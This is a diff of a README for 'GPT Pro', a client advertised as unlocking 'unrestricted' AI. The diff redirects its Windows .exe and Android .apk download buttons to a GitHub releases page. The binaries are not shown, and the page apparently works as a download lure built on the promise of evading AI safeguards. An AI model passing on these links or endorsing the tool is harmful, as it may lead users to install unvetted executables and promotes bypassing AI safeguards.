@@ -12,8 +12,8 @@
 
 <div align="left">
 
-[![Download GPT Pro for Windows](https://img.shields.io/badge/Download-GPT%20Pro%20v1.0.0%20(Windows)-red?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMTAgMTEwIj48cGF0aCBmaWxsPSIjZmZmZmZmIiBkPSJNNzQgMTQuNWMtMTEuOCAxLjktMjEuOCAzLjQtMjIuMiAzLjQtLjUuMS0uOCA4LS44IDE3LjZWNTNoNDdWMzJjMC0xNi4yLS4zLTIxLTEuMi0yMC45LS43LjEtMTEgMS42LTIyLjggMy40bS00OC4yIDYuOC0xNC44IDJWNTNoMzZWMTlsLTMuMi4xYy0xLjguMS05LjkgMS4xLTE4IDIuMk0xMSA3MS44djE4LjhsMTYuMyAyLjJjOC45IDEuMiAxNyAyLjIgMTggMi4yIDEuNSAwIDEuNy0xLjUgMS43LTE3VjU3SDExem00MCAyLjdjMCA5LjYuMSAxNy41LjMgMTcuNS4xIDAgOS44IDEuNCAyMS42IDMgMTEuNyAxLjcgMjIuMiAzIDIzLjIgMyAxLjggMCAxLjktMS4xIDEuOS0yMC41VjU3SDUxeiIvPjwvc3ZnPg==)](https://github.com/rishwebb/Uncensored-GPT-No-Limit/releases/download/v1.0.8/GPT.Pro.Setup.1.0.0.exe)<br>
-[![Download GPT Pro for Android](https://img.shields.io/badge/Download-GPT%20Pro%20v1.0.0%20(Android)-green?style=for-the-badge&logo=android&logoColor=3DDC84)](https://github.com/rishwebb/Uncensored-GPT-No-Limit/releases/download/v1.0.8/GPT-Pro.apk)
+[![Download GPT Pro for Windows](https://img.shields.io/badge/Download-GPT%20Pro%20v1.0.0%20(Windows)-red?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMTAgMTEwIj48cGF0aCBmaWxsPSIjZmZmZmZmIiBkPSJNNzQgMTQuNWMtMTEuOCAxLjktMjEuOCAzLjQtMjIuMiAzLjQtLjUuMS0uOCA4LS44IDE3LjZWNTNoNDdWMzJjMC0xNi4yLS4zLTIxLTEuMi0yMC45LS43LjEtMTEgMS42LTIyLjggMy40bS00OC4yIDYuOC0xNC44IDJWNTNoMzZWMTlsLTMuMi4xYy0xLjguMS05LjkgMS4xLTE4IDIuMk0xMSA3MS44djE4LjhsMTYuMyAyLjJjOC45IDEuMiAxNyAyLjIgMTggMi4yIDEuNSAwIDEuNy0xLjUgMS43LTE3VjU3SDExem00MCAyLjdjMCA5LjYuMSAxNy41LjMgMTcuNS4xIDAgOS44IDEuNCAyMS42IDMgMTEuNyAxLjcgMjIuMiAzIDIzLjIgMyAxLjggMCAxLjktMS4xIDEuOS0yMC41VjU3SDUxeiIvPjwvc3ZnPg==)](https://github.com/rishwebb/unrestricted-gpt-interface/releases/latest)<br>
+[![Download GPT Pro for Android](https://img.shields.io/badge/Download-GPT%20Pro%20v1.0.0%20(Android)-green?style=for-the-badge&logo=android&logoColor=3DDC84)](https://github.com/rishwebb/unrestricted-gpt-interface/releases/latest)
 
 </div>
 
@@ -52,7 +52,7 @@ A sleek, dedicated browser client designed to unlock **unlimited, unrestricted A
 - **Standalone Portable**: Run **`GPT Pro 1.0.0.exe`** directly without installation.
 
 ### Mobile (Android)
-- **APK Installer**: Download and install **`GPT-Pro.apk`** from the button above or [`mobile/dist/GPT-Pro.apk`](mobile/dist/GPT-Pro.apk).
+- **APK Installer**: Download and install **`GPT-Pro.apk`** from the Releases button above.
 
 ---
 
